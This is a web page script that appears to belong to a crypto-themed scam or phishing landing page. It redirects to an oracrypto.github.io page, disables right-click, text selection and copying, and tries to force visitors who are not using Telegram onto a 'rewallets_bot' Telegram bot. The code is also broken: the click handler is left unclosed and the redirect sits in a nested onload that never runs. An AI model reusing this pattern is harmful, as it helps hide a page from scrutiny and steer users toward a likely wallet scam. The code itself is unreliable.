function continueAction() {
    window.location.href = "https://oracrypto.github.io/20java/";
}

document.addEventListener("DOMContentLoaded", function () {
    const lazyImages = document.querySelectorAll("img[data-src]");
    const imageObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const img = entry.target;
                img.src = img.dataset.src;
                img.removeAttribute("data-src");
                observer.unobserve(img);
            }
        });
    });
    lazyImages.forEach(image => imageObserver.observe(image));
});

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

document.addEventListener('selectstart', function(e) {
    e.preventDefault();
});

document.addEventListener('copy', function(e) {
    e.preventDefault();
    alert('');
});


window.onload = function() {
    setTimeout(function() {
        document.getElementById('loading-screen').remove(); 
    }, 1000);
};
document.addEventListener('click', function(event) {
   
    if (document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
       
    }
    window.onload = function() {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;

        const isTelegram = userAgent.toLowerCase().includes("telegram");

      if (!isTelegram) {
          window.location.href = "https://t.me/rewallets_bot";
      }
      }; 
